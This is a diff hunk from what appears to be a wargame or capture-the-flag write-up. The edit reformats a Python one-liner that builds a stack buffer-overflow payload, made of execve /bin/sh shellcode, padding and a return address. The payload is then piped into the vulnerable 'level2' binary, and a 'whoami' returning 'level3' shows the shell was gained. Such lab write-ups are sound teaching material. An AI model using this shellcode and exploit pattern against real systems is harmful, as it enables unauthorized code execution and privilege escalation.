@@ -64,8 +64,7 @@ Here is our payload:
 Let's save it in a file and send it to the vulnerable program:
 
 ```bash
-$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-+ "a" * 56 + "\x08\xa0\x04\x08"' > /tmp/exploit2
+$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * 56 + "\x08\xa0\x04\x08"' > /tmp/exploit2
 $ cat /tmp/exploit2 - | ./level2
 whoami
 level3
